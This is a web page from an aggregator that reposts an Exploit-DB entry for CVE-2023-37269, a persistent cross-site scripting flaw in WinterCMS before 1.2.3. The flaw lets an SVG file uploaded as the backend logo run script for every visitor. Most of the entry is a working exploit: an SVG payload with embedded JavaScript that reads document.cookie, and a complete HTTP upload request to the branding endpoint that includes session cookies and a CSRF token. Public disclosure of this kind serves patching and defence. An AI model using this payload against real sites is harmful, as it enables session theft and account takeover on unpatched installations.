---
title: [webapps] WinterCMS < 1.2.3 - Persistent Cross-Site Scripting
url: https://buaq.net/go-172122.html
source: unSafe.sh - 不安全
date: 2023-07-16
fetch_date: 2025-10-04T11:51:11.711992
---

# [webapps] WinterCMS < 1.2.3 - Persistent Cross-Site Scripting

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] WinterCMS < 1.2.3 - Persistent Cross-Site Scripting

# Exploit Title: WinterCMS < 1.2.3 - Persistent C
*2023-7-15 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-172122.htm)
阅读量:12
收藏*

---

```
# Exploit Title: WinterCMS < 1.2.3 - Persistent Cross-Site Scripting
# Exploit Author: abhishek morla
# Google Dork: N/A
# Date: 2023-07-10
# Vendor Homepage: https://wintercms.com/
# Software Link: https://github.com/wintercms/winter
# Version: 1.2.2
# Tested on: windows64bit / mozila firefox
# CVE : CVE-2023-37269
# Report Link : https://github.com/wintercms/winter/security/advisories/GHSA-wjw2-4j7j-6gc3
# Video POC : https://youtu.be/Dqhq8rdrcqc

Title : Application is Vulnerable to Persistent Cross-Site Scripting via SVG File Upload in Custom Logo Upload Functionality

Description :
WinterCMS < 1.2.3 lacks restrictions on uploading SVG files as website logos, making it vulnerable to a Persistent cross-site scripting (XSS) attack. This vulnerability arises from the ability of an attacker to embed malicious JavaScript content within an SVG file, which remains visible to all users, including anonymous visitors. Consequently, any user interaction with the affected page can inadvertently trigger the execution of the malicious script

Payload:-
// image.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.cookie);
   </script>
</svg>

//Post Request

POST /backend/system/settings/update/winter/backend/branding HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: fk93d30vmHCawwgMlTRy97vPOxaf4iPphtUwioc2
X-WINTER-REQUEST-HANDLER: formLogo::onUpload
Content-Type: multipart/form-data; boundary=---------------------------186411693022341939203410401206
Content-Length: 608
Origin: http://172.17.0.2
Connection: close
Cookie: admin_auth=eyJpdiI6IkV2dElCcWdsZStzWHc5cDVIcFZ1bnc9PSIsInZhbHVlIjoiVFkyV1k3UnBKUVNhSWF2NjVNclVCdXRwNklDQlFmenZXU2hUNi91T3c5aFRTTTR3VWQrVVJkZG5pcFZTTm1IMzFtZzkyWWpRV0FYRnJuZ1VoWXQ0Q2VUTGRScHhVcVRZdWtlSGYxa1kyZTh0RXVScFdySmF1VDZyZ1p0T1pYYWI5M1ZmVWtXUkhpeXg2U0l3NG9ZWHhnPT0iLCJtYWMiOiIyNzk0OTNlOWY2ODZhYjFhMGY0M2Y4Mzk0NjViY2FiOWQ0ZjNjMThlOTkxODZjYmFmNTZkZmY3MmZhMTM3YWJlIiwidGFnIjoiIn0%3D; BBLANG=en_US; winter_session=eyJpdiI6ImJFWHVEb0QrTmo5YjZYcml6Wm1jT3c9PSIsInZhbHVlIjoiQVdVZ3R4ajVUWUZXeS83dkhIQVFhVVYxOE1uajJQOVNzOUtwM1ZGcUFYOC9haHZFMlE2R0llNjZDWVR6eHZqbDZ5Z1J1akM5VkNaQUFZM1p5OGlZcjJFWTRaT21tRWdtcnJUUHJWRWg1QTZyRFhJbEdMc0h1SzZqaEphMFFSSDYiLCJtYWMiOiI0YzRkNWQwODVkMmI4ZmMxMTJlMGU5YjM2MWJkYjNiNjEwZmE2NTY4ZGQwYTdjNjAxMjRkMjRiN2M1NTBiOTNiIiwidGFnIjoiIn0%3D

-----------------------------186411693022341939203410401206
Content-Disposition: form-data; name="file_data"; filename="image.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>

-----------------------------186411693022341939203410401206--

|-----------------------------------------EOF-----------------------------------------
```

文章来源: https://www.exploit-db.com/exploits/51591
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)